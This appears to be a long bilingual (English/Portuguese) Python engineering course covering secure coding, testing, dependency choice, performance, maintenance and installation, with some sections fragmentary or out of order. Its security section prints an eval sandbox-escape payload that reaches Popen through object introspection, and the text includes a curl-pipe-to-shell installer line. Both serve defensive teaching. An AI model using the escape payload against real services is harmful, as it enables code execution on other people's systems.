if not hmac.compare_digest(expected, header_sig):
    raise PermissionError("bad signature")
Trust the bytes only after an authenticated channel. Same rule for tarfile, zipfile, models, and caches.
Why yaml.safe_load is not paranoia Full YAML supports application-specific tags, including Python object construction. A crafted document can instantiate arbitrary objects and, through them, execute commands. safe_load restricts parsing to plain data types. If you need a custom tag, register an explicit constructor for it and treat the input as code. The same reasoning applies to json with a custom object_hook that imports or calls things — JSON itself is data, your hook can make it code.

4. eval, exec, and "just a calculator"

python · why eval cannot be sandboxed by filtering
# Attacker input, even with no imports allowed and empty builtins:
payload = "[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'Popen'][0](['id'])"

# __builtins__ can be reached through object introspection, so restricting
# the globals dict does not create a security boundary.
eval(payload, {"__builtins__": {}})

# Legitimate alternative for arithmetic:
import ast, operator

OPS = {ast.Add: operator.add, ast.Sub: operator.sub,
       ast.Mult: operator.mul, ast.Div: operator.truediv}

def calc(expr: str) -> float:
    def ev(node):
        if isinstance(node, ast.Expression):
            return ev(node.body)
        if isinstance(node, ast.Constant) and isinstance(node.value, (int, float)):
            return node.value
        if isinstance(node, ast.BinOp) and type(node.op) in OPS:
            return OPS[type(node.op)](ev(node.left), ev(node.right))
        raise ValueError("unsupported expression")
    return ev(ast.parse(expr, mode="eval"))

If you genuinely must run untrusted code, you need an OS-level boundary: a container with no network, a read-only filesystem, a non-root user, dropped capabilities, and CPU/memory/time limits. Python's own "sandboxes" (RestrictedPython, empty builtins, ast filters) are hardening measures for semi-trusted code, not security boundaries. Treat any claim otherwise as a vulnerability report waiting to happen.

5. Network: TLS, timeouts, and SSRF

What not to ship
import requests

requests.get(url, verify=False)     # no certificate check
requests.get(url)                   # no timeout: hangs forever
requests.get(url, allow_redirects=True)  # SSRF pivot
urllib.request.urlopen(url)         # also no timeout by default
Verified, bounded, explicit
import httpx

with httpx.Client(
    verify=True,             # default; do not disable
    timeout=httpx.Timeout(5.0, connect=2.0),
    follow_redirects=False,  # decide per call
    headers={"User-Agent": "inventory/2.1"},
) as client:
    resp = client.get(url)
    resp.raise_for_status()

SSRF (server-side request forgery) is the one people miss: if a user supplies a URL that your server fetches, they can reach 169.254.169.254 (cloud metadata), localhost admin panels, or internal RFC 1918 hosts. Validate the resolved IP, reject private/link-local ranges, disable redirects (or re-validate each hop), and use an egress proxy for anything user-driven.

Why disabling verification is never a fix verify=False turns TLS into an obfuscation layer: any on-path attacker can impersonate the server and read or modify traffic, including credentials and tokens. If you see certificate errors, the cause is a missing/expired CA or a wrong hostname — fix the trust store (certifi, your corporate CA, SSL_CERT_FILE), not the check. The same applies to --trusted-host in pip and --insecure in curl: they are incident markers, not configuration.

6. Secrets, passwords, tokens

python · the right primitives
import secrets, hmac, hashlib, os

7. Files, archives, XML

python · archive extraction (zip-slip / tar-slip)
import tarfile, zipfile
from pathlib import Path

DEST = Path("/srv/imports").resolve()

with tarfile.open("upload.tar.gz") as tf:
    for member in tf.getmembers():
        target = (DEST / member.name).resolve()
        if not target.is_relative_to(DEST) or member.issym() or member.islnk():
            raise PermissionError(f"unsafe archive member: {member.name}")
    tf.extractall(DEST, filter="data")

with zipfile.ZipFile("upload.zip") as zf:
    for info in zf.infolist():
        target = (DEST / info.filename).resolve()
        if not target.is_relative_to(DEST):
            raise PermissionError(f"unsafe zip member: {info.filename}")
    zf.extractall(DEST)

Also enforce a maximum uncompressed size (zip bombs), a maximum member count, and a total time budget. Extraction is parsing a hostile format with your privileges — treat it accordingly.

XML parsers can resolve external entities (XXE: read local files, make requests) and expand entities exponentially ("billion laughs"). Use defusedxml for untrusted documents, or a hardened parser configuration. json is not vulnerable to those two, which is one reason to prefer it for internal APIs.

9. Web application specifics

  • Never deploy with debug on. Django's DEBUG=True leaks settings (including secrets in tracebacks); Flask/Werkzeug's interactive debugger is a remote code execution console if reachable. It is protected by a PIN, and the PIN is derivable from machine details.
  • Autoescape templates. Jinja2 escapes HTML by default in .html files; |safe, Markup, and render_template_string with user input undo that. Server-side template injection is RCE, not XSS.
  • CSRF and cookies. Use framework CSRF protection for state-changing requests; set cookies HttpOnly, Secure, SameSite=Lax/Strict.
  • Open redirects. Validate next/return_to as relative paths; allowlist hosts.
  • Error handling. Return a generic 500 page; log the traceback server-side with a request ID. Stack traces in responses reveal paths, versions, and sometimes secrets.
  • CORS. * with credentials is invalid; allowlist origins explicitly. CORS is not access control for server-to-server calls.

Level 08 Testing locked ~30 min

Testing and quality: proof instead of hope

Tests are executable documentation of decisions. Done well, they let you change code quickly; done badly, they lock in implementation details and fail for irrelevant reasons.

The goal is not coverage. The goal is confidence to change code. A test suite earns its cost when it fails for a real regression and stays green for refactors. Everything below is in service of that.

The test pyramid, translated to Python

many · milliseconds

Unit tests

Pure functions, parsers, validators, business rules. No network, no database, no clock. Fast enough to run on save.

some · seconds

Integration tests

SQLite/Postgres, file I/O, HTTP handlers with a test client, message queue round-trips. Real adapters, controlled boundaries.

few · minutes

End-to-end

Playwright/browser flows, containerised services, the actual CLI. Slow and flaky by nature — keep them few and deterministic.

Mocking without lying to yourself

python · mock at the boundary you own
from unittest.mock import patch
import httpx
from shop.rates import fetch_rate

def test_fetch_rate_retries_once_on_503(monkeypatch):
    calls = {"n": 0}
    real_client = httpx.Client

    def fake_get(self, url, **kwargs):
        calls["n"] += 1
        request = httpx.Request("GET", url)
        status = 503 if calls["n"] == 1 else 200
        return httpx.Response(status, json={"rate": "1.10"}, request=request)

    monkeypatch.setattr(httpx.Client, "get", fake_get)
    assert fetch_rate("EUR", "USD") == "1.10"
    assert calls["n"] == 2

# Prefer respx/responses for HTTP: they intercept the transport, not your code.
# Prefer a fake repository class over patching five methods on a real one.
# Never assert that a private helper was called: that is a refactor alarm.
Why patching the transport beats patching your own function monkeypatch.setattr(shop.rates, "_get", fake) tests that fetch_rate calls a function named _get — an implementation detail. Replacing the HTTP transport (respx, responses, httpx.MockTransport) tests the real code path, including URL building, headers, retries and JSON parsing. Choose the highest seam that still removes the non-determinism.

Property-based testing with Hypothesis

Example-based tests check the cases you thought of. Hypothesis generates the ones you did not: empty lists, huge integers, unicode edge cases, NaN, negative zero.

python · invariants, not examples
from hypothesis import given, strategies as st, settings
from shop.money import parse_amount, format_amount

@given(st.decimals(min_value="0", max_value="999999.99", places=2))
def test_roundtrip(amount):
    assert parse_amount(format_amount(amount)) == amount

@given(st.text())
def test_parse_never_crashes_on_arbitrary_text(raw):
    try:
        parse_amount(raw)
    except ValueError:
        pass          # rejecting is fine; crashing is not

@settings(max_examples=500, deadline=None)
@given(st.lists(st.integers(), min_size=0, max_size=100))
def test_sort_is_idempotent(values):
    once = sorted(values)
    assert sorted(once) == once

Hypothesis shrinks failures to the smallest example and prints a reproducible seed. Keep the failing case as a regression test; the seed is valuable but the minimal example is documentation.

Libraries by objective, and how to judge one in ten minutes

PyPI has over half a million projects. The skill is not memorising them — it is a repeatable protocol for deciding whether a package deserves to live in your dependency tree.

A dependency is a long-term relationship: you inherit its bugs, its release cadence, its licence, its transitive tree, and its security posture. Treat adding one like hiring, not shopping.

The ten-minute evaluation protocol

  1. Read the PyPI page, not the README on GitHub. PyPI shows the published metadata: version, release date, Requires-Python, licence, classifiers, project URLs, and the declared dependencies. GitHub shows what the maintainer wants you to see.
  2. Check release cadence and version numbers. One release three years ago is a warning; a 0.x version is an API-stability warning. Neither is disqualifying, but both change your pinning strategy.
  3. Look at the dependency tree. uv tree or pip install --dry-run shows what comes along. A "small" library that pulls 40 packages is not small.
  4. Confirm wheels exist for your platform and Python version. No wheel means a build from source, which means compilers and system headers in CI and production.
  5. Check typing and docs. A py.typed marker plus real API docs means your editor can help you; autogenerated stub-only docs are a hint about maturity.
  6. Search the issue tracker for your exact use case, and for the words "security", "leak", "race", "deprecated". Read how maintainers respond, not just whether issues exist.
  7. Run it in a disposable environment before adopting: import it, call the API you need, and write one test. This catches packaging lies in minutes.
  8. Check the licence against your distribution model (AGPL in a SaaS, GPL in a closed binary). Then check the licence of its dependencies — licences compose.
  9. Look for a security signal. OSV/GitHub advisories, OpenSSF Scorecard, signed releases, a SECURITY.md. Absence is not guilt, but presence is data.
  10. Write down the alternative you rejected. One line in the PR or ADR: "chose httpx over requests for async + HTTP/2". Future-you will need it.

python · FastAPI + Pydantic, with validation and a timeout
from contextlib import asynccontextmanager
from decimal import Decimal
import httpx
from fastapi import FastAPI, HTTPException
from pydantic import BaseModel, Field

class OrderIn(BaseModel):
    sku: str = Field(pattern=r"^[A-Z0-9-]{3,32}$")
    qty: int = Field(gt=0, le=1000)

class OrderOut(OrderIn):
    total: Decimal

@asynccontextmanager
async def lifespan(app: FastAPI):
    app.state.http = httpx.AsyncClient(timeout=5.0)
    try:
        yield
    finally:
        await app.state.http.aclose()

app = FastAPI(lifespan=lifespan, title="Orders")

@app.post("/orders", response_model=OrderOut, status_code=201)
async def create_order(order: OrderIn) -> OrderOut:
    price = Decimal("19.99")
    return OrderOut(**order.model_dump(), total=price * order.qty)

# Run:  uvicorn app:app --host 127.0.0.1 --port 8000
# Prod: gunicorn app:app -k uvicorn.workers.UvicornWorker -w 4 --timeout 30

WSGI vs ASGI matters for library choice: Django and Flask are WSGI (sync); FastAPI/Starlette are ASGI (async). You can run sync code in an ASGI app, but blocking calls in an async def handler stall the event loop and destroy throughput. Mixing the two is where most performance incidents in "async" Python come from.

import httpx
from tenacity import (retry, stop_after_attempt, wait_exponential_jitter,
                      retry_if_exception_type, before_sleep_log)
import logging

log = logging.getLogger(__name__)

@retry(
    retry=retry_if_exception_type((httpx.TimeoutException, httpx.HTTPStatusError)),
    wait=wait_exponential_jitter(initial=0.5, max=8),
    stop=stop_after_attempt(4),
    before_sleep=before_sleep_log(log, logging.WARNING),
    reraise=True,
)
def get_json(url: str) -> dict:
    resp = httpx.get(url, timeout=httpx.Timeout(5.0, connect=2.0))
    if resp.status_code in {429, 500, 502, 503, 504}:
        resp.raise_for_status()
    resp.raise_for_status()
    return resp.json()

Why this shape: dependencies are installed in a layer that only changes when the lockfile changes (fast rebuilds), the runtime image has no compiler or build cache, the process runs as a fixed non-root UID, and the healthcheck uses Python instead of assuming curl exists.

Bad decision — pip install -r requirements.txt at container start It makes startup depend on the network and PyPI's availability, produces a different environment every time a transitive dependency publishes, slows scaling, and requires build tools in the runtime image. It also means a rollback is not a rollback: the old image now installs new packages. Install at build time from a lockfile, tag the image with the commit SHA, and deploy that immutable artefact. The only runtime installs should be deliberate, versioned, and rare.
Bad decision — one giant requirements.txt with == everywhere and no lock semantics Pinning only direct dependencies leaves transitives floating; pinning every transitive by hand is unmaintainable and silently drops hashes. And a file produced by pip freeze from a developer's environment often contains packages nobody declared, plus local paths. Choose a real resolver (uv, Poetry, pip-tools) and let it produce the lock. Then update on a schedule with a human reviewing the diff.

Performance and debugging: measure, then change one thing

Almost all Python performance work is: find the actual bottleneck, remove unnecessary work, and move the remaining work to a better layer. Everything else is folklore.

A program has a budget: CPU, memory, latency, and human attention. Optimising the wrong one is how teams spend a sprint making a report 8% faster while the database does 40 queries per row.

Step 0: define the number you are improving

python · a benchmark you can trust
import timeit, statistics, random

SETUP = "data = [random.random() for _ in range(100_000)]"

def bench(stmt: str, number: int = 20) -> tuple[float, float]:
    times = timeit.repeat(stmt, setup=SETUP, number=number, repeat=5,
                          globals={"random": random})
    return min(times) / number, statistics.median(times) / number

for stmt in ("sum(data)", "sum([x for x in data])", "sum(x for x in data)"):
    best, median = bench(stmt)
    print(f"{stmt:<28} best={best*1e3:.3f}ms median={median*1e3:.3f}ms")

Use realistic data sizes and shapes; micro-benchmarks on tiny inputs measure function-call overhead, not the algorithm. Report the median and the worst case, not just the best. And always measure the version you ship, with the same Python build and optimisation flags.

The optimisations that usually matter

  1. Do less work. Kill N+1 queries, cache pure functions, batch requests, avoid re-parsing immutable data, short-circuit early. This beats every micro-optimisation.
  2. Use the right data structure. Membership tests: set/dict O(1) vs list O(n). Counting: collections.Counter. Queues: collections.deque, not list.pop(0).
  3. Push work into native code. NumPy/Polars/DuckDB, database aggregation, C extensions — vectorised operations release the GIL and reduce interpreter overhead by orders of magnitude.
  4. Batch I/O. One query with 1,000 IDs beats 1,000 queries. Buffered writes beat per-row commits (commit per N rows or per batch).
  5. Stream instead of materialise. Generators, iterparse, chunked reads: constant memory and better cache behaviour.
  6. Parallelise the right thing. Threads for I/O, processes for CPU, async for high-concurrency I/O. Measure the speedup; contention and pickling often eat it.

Why list.pop(0) is a bug, not a style choice Removing the first element of a Python list shifts every remaining element: O(n) per pop, O(n²) for a queue of n items. At 100,000 items that is billions of pointer moves disguised as a one-line loop. deque.popleft() is O(1). The same class of issue appears with repeated string concatenation (s += x in a loop), repeated in checks against a list, and sorted() inside a loop.

Debugging: a method, not a vibe

  1. Reproduce deterministically. Same input, same environment, same seed. If you cannot reproduce it, add observability until you can.
  2. Shrink the input. A minimal failing case is 80% of the fix, and it becomes the regression test.
  3. Read the whole traceback. The last frame is where it broke; the frame above is usually why. raise ... from chains matter.
  4. Inspect state, don't guess. breakpoint(), pp locals(), log the actual values. Print statements are fine — but log them.
  5. Bisect. git bisect for regressions; disable half the pipeline to localise. Binary search is faster than intuition.
  6. Fix the cause, add a test, then remove the instrumentation.

Bad decision — optimising before profiling Intuition about performance is wrong often enough to be dangerous. Developers optimise string formatting while 90% of the time is a missing index; they add __slots__ to a class instantiated 12 times; they rewrite comprehensions while the service waits on a 400 ms upstream call. The cost is not just wasted effort: the added complexity becomes permanent, and the real bottleneck ships. Profile first, change one thing, re-measure with the same benchmark, and keep a note of the before/after. If you cannot state the metric and the delta, you have not optimised — you have edited.

Signals and graceful shutdown

python · stop accepting work, finish in-flight, exit
import asyncio, logging, signal

log = logging.getLogger("shop")

async def serve(stop: asyncio.Event) -> None:
    server = await asyncio.start_server(handle, "127.0.0.1", 8000)
    async with server:
        await stop.wait()
    log.info("server closed; draining")
    await asyncio.sleep(0)          # let handlers finish; add a bounded drain here

def install_signal_handlers(stop: asyncio.Event) -> None:
    loop = asyncio.get_running_loop()
    for sig in (signal.SIGTERM, signal.SIGINT):
        loop.add_signal_handler(sig, stop.set)

async def main() -> None:
    stop = asyncio.Event()
    install_signal_handlers(stop)
    await serve(stop)

# For sync WSGI apps, the server (gunicorn/uvicorn) handles signals:
#   gunicorn app:app --workers 4 --timeout 30 --graceful-timeout 30 --access-logfile -
# Do not run your own signal handlers in a prefork worker.

What "graceful" means in practice: stop accepting new requests, finish in-flight ones within a bound, close pools, flush logs, exit 0. If shutdown takes longer than the orchestrator's grace period, it sends SIGKILL and you lose in-flight work — so set TimeoutStopSec/--graceful-timeout below the platform's kill window.

Observability: the three questions

logs

What happened?

Structured JSON to stdout with timestamp, level, logger, request ID, and stable event names. No secrets, no PII. Let the platform index and retain.

metrics

How much, how fast?

RED (rate, errors, duration) for services; USE (utilisation, saturation, errors) for resources. Histograms, not averages. Alert on symptoms users feel.

traces

Where did the time go?

One trace per request across services, with spans for DB and outbound calls. Sample intelligently; keep errors and slow requests.

REQUESTS = Counter("shop_requests_total", "HTTP requests", ["route", "status"])

                    buckets=(.01, .025, .05, .1, .25, .5, 1, 2.5, 5, 10))

def record(route: str, status: int, started: float) -> None:
    REQUESTS.labels(route=route, status=str(status)).inc()
    LATENCY.labels(route=route).observe(time.perf_counter() - started)

# Expose on a separate internal port; never on the public listener.
start_http_server(9100, addr="127.0.0.1")

Bad decision — nohup python app.py & There is no supervision: when it crashes, nothing restarts it; when the host reboots, it is gone; logs go to a file that fills the disk; there is no resource limit, no health check, and no clean shutdown. The 30 seconds you save are repaid the first time the process dies at 02:00 and nobody notices until morning.
Bad decision — logging everything to a file inside the container Container filesystems are ephemeral: the log disappears when the container is replaced, and an unbounded file can fill the writable layer and crash the node. Long-term maintenance: the part nobody writes tutorials about

Software spends most of its life after the first release. Python moves on a predictable annual cadence, dependencies drift, and the only defence is a boring, scheduled process.

Every Python minor version gets roughly five years of support: about two years of bugfix releases, then three more of security-only fixes. After that, no CVE patches — even for critical issues. Running an EOL interpreter is a compliance finding, not a preference.

Upgrade strategy that does not require heroics

  1. Track two versions ahead. If production is 3.12, CI already runs 3.13 and 3.14. You learn about incompatibilities a year before they are urgent.
  2. Fail on deprecations. -W error::DeprecationWarning in tests, plus ruff's UP rules and pyupgrade. A warning you ignore today is a breakage you debug during an upgrade window.
  3. Upgrade dependencies monthly, not yearly. Small, reviewed lockfile diffs are boring; a year of accumulated changes is a project. Automate the PR, keep the human review.
  4. Read "What's New" and "Porting to" for each version you cross. They are short, precise, and list removals that no amount of testing will discover if the code path is untested.
  5. Test the oldest and newest supported versions. Oldest catches accidental use of new syntax; newest catches deprecations and behaviour changes.
  6. Keep a rollback path. The interpreter version is part of the artefact (container image/digest). Do not upgrade the runtime in place on a pet server.

Why deprecation warnings are a gift Python's deprecation policy is unusually generous: features are announced, warned about for at least two minor releases (often longer), then removed. That window is the entire upgrade budget. Teams that silence warnings spend that budget and then pay it back with interest during an emergency upgrade after an EOL announcement. Treat a new DeprecationWarning as a scheduled task, not noise.

Keep an inventory: direct dependencies, why each exists, who owns the decision, and the exit plan. When a package is abandoned, you want to discover it during planning, not during an incident. For high-assurance environments, generate an SBOM (CycloneDX) from the lockfile and store it with the release artefact.

Documentation that survives you

  • README: what it does, how to run it locally, how to deploy, where the runbook lives. Three commands, no archaeology.
  • ADRs (architecture decision records): one page per significant choice — context, options, decision, consequences. The rejected options are the valuable part.
  • Runbook: symptoms → checks → actions → escalation. Written for the person who did not build it, at 03:00, with no context.
  • Upgrade notes: what broke last time, which flag or pinned version is load-bearing. A `docs/upgrades.md` of ten lines saves hours.
  • Docstrings that state contracts, not restate the code. Include raises, side effects, and units.

O que o Python é de facto (e o que não é)

A maior parte dos estragos com Python acontece antes da primeira linha de código: interpretador errado, ambiente errado, expectativas erradas. Antes de tocar num instalador, constrói o modelo mental.

O Python é uma especificação de linguagem mais uma implementação de referência. O CPython — o que vem de python.org, da tua distribuição ou do uv — compila o teu código para bytecode e executa-o numa máquina virtual. É essa distinção que explica quase todas as mensagens de erro confusas que vais encontrar.

As cinco coisas que existem em disco

Quando instalas «Python», estás na verdade a instalar uma disposição de ficheiros. Aprende-a uma vez e os problemas de ambiente deixam de ser misteriosos. python -m sysconfig | head -40 mostra os caminhos reais do interpretador que está a correr.

Quatro camadas, um processo

O código Python vive numa pilha de camadas. Os erros que parecem «o Python está avariado» são quase sempre um desencontro entre duas camadas vizinhas.

  1. Linguagem — sintaxe e semântica. Versãoada por minor (3.12, 3.13, 3.14, 3.15). A sintaxe nova pode não existir em interpretadores antigos; é para isso que serve requires-python.
  2. Biblioteca padrão — vem com o interpretador, tem o mesmo número de versão e não se instala por pip. Nunca pip install json: esse nome de pacote está ocupado por um squatter.
  3. Pacotes de terceiros — instalados num directório site-packages, resolvidos pela ordem de sys.path.
  4. O teu projecto — código-fonte mais a declaração de quais das camadas acima precisa.
bash · confirm what you are actually running
python3 -VV              # e.g. Python 3.13.7 (main, ...) [GCC 14.2.0]
which -a python3 python  # every Python on PATH, in resolution order
python3 -c 'import sys; print(sys.executable); print(sys.prefix); print(sys.path)'

Esse último comando é o diagnóstico mais útil do Python. sys.executable diz que binário está a correr; sys.prefix diz a que ambiente pertence; sys.path diz onde os imports vão procurar, e ganha a primeira correspondência. Se um pacote «está instalado mas não se importa», estas três linhas respondem em segundos.

Bad decision #0 — "Python is installed, so I can pip install anything" There are usually three or more Pythons on a modern Linux machine: the OS one (/usr/bin/python3), a Homebrew or pyenv one, and one inside each project. pip on your PATH may belong to none of the ones you run. This is the root cause of the classic "I installed requests but Python says ModuleNãotFoundError". The fix is not to reinstall — it is to stop calling bare pip. Uso python -m pip, or better, activate the project environment first. Then pip cannot point at the wrong interpreter, because it is the interpreter.

Instalar o Python 3 sem partir a máquina

Não existe um único passo «instalar o Python». Existem cinco estratégias legítimas, com raios de destruição diferentes. Escolher a errada é a forma como as pessoas acabam com o ambiente de trabalho partido e uma pilha de separadores do Stack Overflow.

Primeiro, uma regra que te poupa horas: nunca deixes um projecto depender do Python do sistema operativo. A tua distribuição usa Python para ferramentas do sistema — gestores de pacotes, controladores, utilitários do ambiente gráfico. Trata /usr/bin/python3 como infra-estrutura só de leitura e instala o teu próprio interpretador para o teu trabalho.

O uv instala builds standalone de CPython (do projecto python-build-standalone) na tua home. Sem root, sem compilação, sem alterar o sistema.

Piping curl into sh Convenient, and a supply-chain habit worth breaking. For anything you care about, download the script, read it, verify the checksum/signature where the project provides one, then run it. The same applies to installers from any vendor — including Python-adjacent tooling. "It's from a well-known project" is not verification; a compromised release is still a release.

Windows: o instalador e a armadilha da Store

  1. Descarrega o instalador de Windows de python.org/downloads/windows. Evita «pacotes de Python» de terceiros.
  2. Marca Add python.exe to PATH no primeiro ecrã. Se te esqueceres, volta a correr o instalador e escolhe Modify em vez de reinstalar às cegas.

Nível 02 Configuração leitura ~20 min

Configuração pós-instalação: PATH, pip e variáveis de ambiente

Uma instalação nova é um ponto de partida, não um sistema a funcionar. Este nível é a diferença entre um interpretador com que se luta e um que se comporta.

A configuração acontece em três âmbitos: a shell (PATH e variáveis exportadas), o interpretador (site, ficheiros .pth, site do utilizador) e as ferramentas (configuração do pip, editor, hooks de git). Acerta a ordem e o resto compõe-se.

1. PATH: a única configuração de que a maioria das pessoas precisa

Os programas são encontrados por PATH, da esquerda para a direita. Os scripts de consola instalados com pip --user e pipx vão para ~/.local/bin (Linux/macOS) ou %APPDATA%\Python\Python3xx\Scripts (Windows). Se esse directório não estiver no PATH, a instalação passa e o comando «não existe».

bash · make user scripts visible (Linux/macOS)
echo "$PATH" | tr ':' '\n' | grep -E '\.local/bin|\.venv|pyenv'
# Append once, in ~/.profile for POSIX shells, or ~/.zshrc / ~/.bashrc for interactive shells:
echo 'export PATH="$HOME/.local/bin:$PATH"' >> ~/.profile
exec "$SHELL" -l
command -v pytest ruff uv pipx
Which file: .bashrc, .profile, .zshrc? ~/.bashrc runs for interactive non-login shells; ~/.profile runs for login shells (and is read by most display managers); zsh uses ~/.zshrc + ~/.zprofile. GUI applications and systemd services often start without your interactive shell config, so a PATH that works in the terminal can still be missing under systemd. That is why services should call interpreters by absolute path (see Level 13), not rely on PATH.
Bad decision — alias python=python3 and alias pip=pip3 It feels harmless. It is not: aliases do not apply to scripts, cron, systemd, IDEs, or subprocess, so you get a machine that behaves one way interactively and another way in production. On Debian/Ubuntu, python is deliberately absent from the base system because Python 2-era tooling would silently pick it up. Worse, alias pip=pip3 hides which interpreter pip belongs to. The robust fix is to create a virtual environment and let python and pip both resolve inside .venv/bin. If you truly need a user-level python, use a symlink in ~/.local/bin pointing at a specific version and understand that every non-shell context will ignore it.

2. pip: configura-o uma vez, bem

O pip lê configuração de três âmbitos — global (/etc/pip.conf), do utilizador (~/.config/pip/pip.conf) e do site (.venv/pip.conf) — mais as variáveis de ambiente PIP_*. Os âmbitos seguintes ganham, e as flags da linha de comando ganham a tudo. Inspecciona antes de editar:

bash · pip configuration
python3 -m pip config debug        # every file considered, and its values
python3 -m pip config list
python3 -m pip --version           # confirm which pip, from which environment
python3 -m pip cache dir           # where wheels are cached
ini · ~/.config/pip/pip.conf
[global]
# Only change these if your organisation actually runs a mirror.
# index-url = https://pypi.org/simple
timeout = 20
retries = 3
disable-pip-version-check = true

[install]
# Fail loudly instead of silently drifting when a version is yanked.
prefer-binary = true
Bad decision — trusted-host as a permanent fix Adding trusted-host or --trusted-host disables TLS certificate verification for that index. People add it to silence corporate-proxy errors and then forget it exists; every package they install afterwards is trivially interceptable. The correct fixes are: install your organisation's CA certificate into the system trust store, point pip at it with cert = /path/ca.pem, or configure the proxy in pip.conf. If you inherit a machine with trusted-host set, treat it as a security finding.

4. Hooks de arranque: sitecustomize e .pth

O Python importa site no arranque, e isso pode executar código em teu nome. Vale a pena conhecer dois mecanismos — um legítimo, outro favorito dos atacantes.

  • sitecustomize.py em site-packages: importado automaticamente se existir. Legítimo para omissões de toda a organização (por exemplo um hook de métricas); surpreendente em ambientes partilhados.
  • *.pth: cada linha é um caminho a acrescentar ao sys.path, mas as linhas que começam por import são executadas. Um .pth malicioso ou descuidado em site-packages é execução de código arbitrário em cada arranque do interpretador.
bash · audit startup hooks
python3 -c "import site; print('\n'.join(site.getsitepackages()))"
find "$(python3 -c 'import site; print(site.getsitepackages()[0])')" -maxdepth 1 -name '*.pth' -print -exec cat {} \;
python3 -S -c "import sys; print(sys.path)"   # -S: skip site processing entirely

6. Locale, hora e codificação

Três problemas de configuração causam grande parte dos erros de «funciona na minha máquina» no processamento de texto: a codificação do sistema de ficheiros, a codificação por omissão de open() e as datas sem fuso. O Python 3.15 torna o UTF-8 a codificação de texto por omissão (implantação do PEP 686); em versões anteriores, passa encoding="utf-8" explicitamente a cada open() e nunca confies no locale para formatos de ficheiro.

python · check the environment assumptions
import locale, sys, datetime as dt

print(sys.getfilesystemencoding(), sys.getdefaultencoding())
print(locale.getpreferredencoding(False))

# Portable, explicit, boring - the three qualities you want in I/O:
with open("report.csv", "w", encoding="utf-8", newline="") as fh:
    fh.write("id,name\n1,Zoë\n")
Bad decision — sudo pip install, then sudo everything else Installing system-wide with sudo mixes your packages into the distro's site-packages, where the package manager does not know about them. Files land root-owned, later upgrades conflict with distro packages, and the "fix" is always more sudo. On PEP 668 systems pip now refuses by default — that refusal is a feature, not an obstacle. Uso a virtual environment per project, pipx for command-line tools, and uv tool as a faster equivalent. Even genuinely system-wide needs (a package required by a system service) belong in a dedicated environment owned by that service, not in /usr/lib/python3.

Nível 03 Ambientes leitura ~30 min required for Linux

venv, PEP 668 e o muro do «gerido externamente»

Em Debian 12+, Ubuntu 23.04+, Fedora 38+ e derivados, o pip recusa-se a instalar no interpretador do sistema. Não é um bug nem um problema de permissões. Compreendê-lo é a maior lacuna de quem chega ao Python em Linux.

Em 2023 o ecossistema de empacotamento do Python normalizou um ficheiro marcador que diz ao pip: «este interpretador pertence ao sistema operativo; não o alteres.» Isso é o PEP 668. A mensagem de recusa que vais ver não é um obstáculo a contornar — é o sistema operativo a proteger-se de ti, e está certo.

O erro, textualmente

console · what PEP 668 looks like

Por baixo existe um ficheiro: /usr/lib/python3.13/EXTERNALLY-MANAGED. O pip procura-o no arranque; se existir e não estiveres dentro de um ambiente virtual, as instalações são recusadas. Podes vê-lo tu mesmo:

bash · inspect the marker
python3 -c "import sysconfig, pathlib; p = pathlib.Path(sysconfig.get_path('stdlib')) / 'EXTERNALLY-MANAGED'; print(p, p.exists()); print(p.read_text() if p.exists() else '')"
Why distributions do this Your desktop and server tools are Python programs: apt's front-ends, NetworkManager helpers, apport, dnf, cloud-init, firewalld, and hundreds of vendor scripts. They were tested against the exact library versions the distro shipped. A stray pip install --upgrade requests can replace a library under a system daemon, and the failure appears later as a crash in an unrelated service — with no package record to explain it. PEP 668 makes that class of breakage impossible by default. Fedora's change proposal, Debian's implementation, and the PyPA specification all say the same thing: the system interpreter is a runtime for OS software, not a workspace for your project.

O que é de facto um ambiente virtual

Um venv é um directório com um ficheiro pyvenv.cfg, uma cópia ou ligação simbólica do interpretador e o seu próprio site-packages. Quando esse interpretador arranca, põe sys.prefix a apontar para o venv e procura no site-packages dele em vez do da instalação base. Activar não é mais do que mudar o PATH e um aviso no prompt — o isolamento vem da localização do interpretador, não do source.

bash · anatomy of a venv
python3 -m venv .venv
find .venv -maxdepth 2 \( -name 'pyvenv.cfg' -o -name 'python*' -o -name 'site-packages' \) | sort
cat .venv/pyvenv.cfg
ini · .venv/pyvenv.cfg
home = /usr/bin
include-system-site-packages = false
version = 3.13.7
executable = /usr/bin/python3.13
command = /usr/bin/python3 -m venv /home/dev/project/.venv

Daí resultam de imediato duas consequências:

  1. Não movas nem copies um venv. Os caminhos ficam gravados lá dentro. Recria-o — leva segundos e é determinístico se tiveres um lockfile.
  2. Não o versiones. Põe .venv/ no .gitignore. Contém caminhos absolutos, binários específicos da plataforma e centenas de megabytes de código empacotado.

Criar um venv correctamente, com todas as flags que contam

# Let the venv see distro packages (needed for some ROS / apt-installed libs).
# Understand the trade-off before using it: distro versions win over pip's.
python3 -m venv --system-site-packages .venv

/usr/bin/python3.13 -m venv .venv
uv venv --python 3.13 .venv

# No pip, no setuptools (uv-managed or minimal images):
python3 -m venv --without-pip .venv
Bad decision — --system-site-packages as a default It looks like a shortcut for "I already have numpy installed". In practice it merges two package universes with no version negotiation: a pip install foo inside the venv can be silently satisfied by an incompatible distro build of foo, and removals become impossible to reason about. Worse, on Debian the distro packages are patched, so behaviour can differ from upstream in ways no lockfile records. Uso it only when a binary package genuinely cannot be installed otherwise, and document why in the repo (a comment in pyproject.toml or a README note). The alternative is a container base image that gives you the system library without the Python-package entanglement.

Imutabilidade, NixOS e o «não se pode correr Python sem venv»

Alguns sistemas vão mais longe do que o PEP 668. Em NixOS o interpretador não tem site-packages gravável e o pip pode estar ausente por completo; no Fedora Silverblue e noutras distribuições baseadas em imagens, o /usr é só de leitura. curl -LsSf https://astral.sh/uv/install.sh | sh

The pattern that always works One project → one directory → one .venv → one declared dependency set (pyproject.toml + lockfile). Enter it with uv run or by absolute path. If a tutorial tells you to sudo pip install, the tutorial is from a different era — the correct translation is almost always "create a venv".

Reconstruções reprodutíveis e o hábito do lockfile

Um venv é descartável; a tua declaração de dependências é a fonte de verdade. Dois comandos devem reconstruir qualquer projecto de raiz:

bash · rebuild from scratch
rm -rf .venv
uv sync --frozen             # exact versions from uv.lock

# pip-only projects:
rm -rf .venv && python3 -m venv .venv
.venv/bin/python -m pip install --require-hashes -r requirements.txt

